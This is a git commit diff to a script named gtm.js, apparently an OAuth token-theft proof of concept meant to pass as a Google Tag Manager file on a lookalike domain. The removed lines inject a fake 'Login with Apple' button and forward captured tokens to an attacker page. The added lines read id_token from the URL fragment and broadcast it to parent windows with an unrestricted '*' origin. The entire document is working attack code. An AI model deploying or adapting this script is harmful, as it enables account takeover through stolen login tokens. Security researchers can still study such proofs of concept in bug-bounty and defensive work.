9e833d5e214bec659565d328e994ed28d4259934
oauthtest444 <oauthtest444@gmail.com>
2026-05-17 19:01:36 +0530

    Update gtm.js

--- gtm.js
+++ gtm.js
@@ -1,32 +1,17 @@
-<!-- Save this file as: https://subs-redditt.github.io/gtm.js -->
-
 <script>
-var state = new URLSearchParams(parent.location.search).get('state') || 'defaultstate';
+    console.log("%c[GTM] Leaky script running", "color:red");
 
-if (!window.inited) {
-    window.inited = true;
+    const state = new URLSearchParams(location.search).get('state') || 'teststate123';
 
-    // Simulate injecting a fake button
-    var d = document.createElement('div');
-    d.innerHTML = `
-        <h2 style="color:red;">Test Login Simulation</h2>
-        <a href="https://oauthtest444.github.io/redditt.github.io/?state=${encodeURIComponent(state)}" 
-           target="_blank" style="font-size:18px;color:white;background:red;padding:10px;">
-           Click here to "Login with Apple" (Test)
-        </a>
-    `;
-    document.body.appendChild(d);
+    if (!window.inited) {
+        window.inited = true;
 
-    // Listen for token and send back to attacker
-    window.addEventListener('message', function(e) {
-        if (e.data && (e.data.includes('id_token') || e.data.includes('code'))) {
-            top.postMessage(e.data, '*');   // Send to attacker page
+        // Auto send token if present in URL
+        if (location.hash && location.hash.includes('id_token')) {
+            console.log("%c[GTM] Token found in URL, sending to attacker...", "color:lime");
+            top.postMessage(location.hash, '*');           // Most important line
+            parent.postMessage(location.hash, '*');        // Extra safety
+            window.postMessage(location.hash, '*');
         }
-    });
-
-    // Auto forward if token is in URL fragment
-    if (location.hash.includes('id_token')) {
-        top.postMessage(location.hash, '*');
     }
-}
 </script>
